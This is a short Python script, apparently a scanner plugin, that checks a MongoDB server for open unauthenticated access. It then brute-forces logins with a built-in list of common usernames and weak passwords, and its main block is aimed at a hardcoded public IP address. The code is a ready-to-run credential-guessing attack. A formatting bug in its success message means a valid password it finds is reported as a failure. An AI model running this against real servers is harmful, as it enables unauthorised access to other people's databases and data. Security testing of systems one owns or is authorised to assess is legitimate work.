# -*- coding:utf-8 -*-

import pymongo
from pymongo.errors import ServerSelectionTimeoutError

def verify(protocol,ip,port):
    host = ip+':'+str(port)
    port = int(port)
    loginnames = ['admin','test','zte','user','root']
    passwd = ['','123456','test','12345678','12345679','root','123456Aa','123456_Aa','123456aA','123456_aA','123QWEASD','admin123','admin','1q2w3e4r','134679']
    print('testing if mongodb vul')
    #是否无认证
    try:
        connection = pymongo.MongoClient(ip,port,serverSelectionTimeoutMS=1000)
        dbs = connection.database_names()
        msg = 'There is a mongodb unauthorized access , password is None'
        number = 'v9'
        print(dbs)
        return True,host,number,msg        
     #端口连不上,直接退出
    except ServerSelectionTimeoutError as e:
        msg = str(e)
        number = 'v0'
        return False,host,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
    #爆破
    for loginname in loginnames:
        for ps in passwd:           
            try:
                connection.api.authenticate(loginname,ps)
                dbs = connection.database_names()
                msg = 'There is a mongodb unauthorized access , username/password is %s' %(loginname,ps)
                number = 'v9'
                print(msg)
                return True,host,number,msg
            except Exception as e:
                msg = str(e)
                number = 'v0'
    return False,host,number,msg
if __name__ == '__main__':
    ip = '69.172.89.148'
    port = '27017'
    res = verify('mongod',ip,port)
    print(res)
